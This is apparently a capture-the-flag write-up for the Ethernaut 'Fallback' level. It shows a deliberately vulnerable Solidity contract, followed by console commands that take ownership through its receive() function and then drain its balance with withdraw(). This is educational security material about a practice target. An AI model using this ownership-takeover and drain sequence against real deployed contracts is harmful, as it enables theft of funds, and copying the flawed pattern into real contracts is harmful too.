# Fallback
>You will beat this level if
>   1. you claim ownership of the contract
>   2. you reduce its balance to 0

>Things that might help
>How to send ether when interacting with an ABI
>How to send ether outside of the ABI
>Converting to and from wei/ether units (see help() command)
>Fallback methods

``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```

For this challenge, first, we are required to claim the ownership of this contract. Looking at the solidity code given to us, we can see that the code `owner = msg.sender` will be executed in two ways. 
One way is to transfer ether more than the contributions of the owner but that is not possible! (since owner's contribution is fairly large). What we will do is first contribute a small amount of ether and then send ether to this contract so that recieve function gets called and we can claim the ownership.

The receive function is similar to the fallback function. It gets called whenever the contract receives some ether. It is designed specifically to handle incoming ether without the need for a data call.
Executing the approach...

```
>await contract.contribute({value : 4})
```
```
>await contract.sendTransaction({value : 1})
```
```
>await contract.owner()
<'0x532600377959B703AA4AC2c468DeDe8FAA40B576'
```
and so the first step is done! Now don't forget to withdraw ether from this contract.
```
>await contract.withdraw()
```
```
>await getBalance("0xf246A7CD5d85F553ee44E3271Ad8bd1f77434e95")
<'0'
```
Viola!

